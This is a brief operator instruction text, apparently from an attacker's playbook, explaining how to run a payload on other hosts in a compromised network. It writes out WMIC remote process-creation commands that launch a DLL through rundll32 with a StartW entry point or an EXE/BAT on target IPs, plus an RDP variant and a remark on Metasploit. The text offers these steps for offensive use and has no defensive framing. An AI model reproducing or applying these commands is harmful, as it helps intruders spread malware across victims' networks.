Run VMICOM, we use it more often.
1) if it's a dll, then
shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"

Accordingly, where the IP address, we put the IP address of the machine we have access to, then comes the path and the name of our dll, I think the syntax is clear

If you are on RDP > open CMD as administrator and rundll32.exe C:\ProgramData\x64.dll,StartW you can define any path, according to where your dll is


For EXE or .bat format you can run VMICOM as follows

shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"



You can also load and run via metasploit, but we rarely use this tool now, because it is not working correctly in the latest version
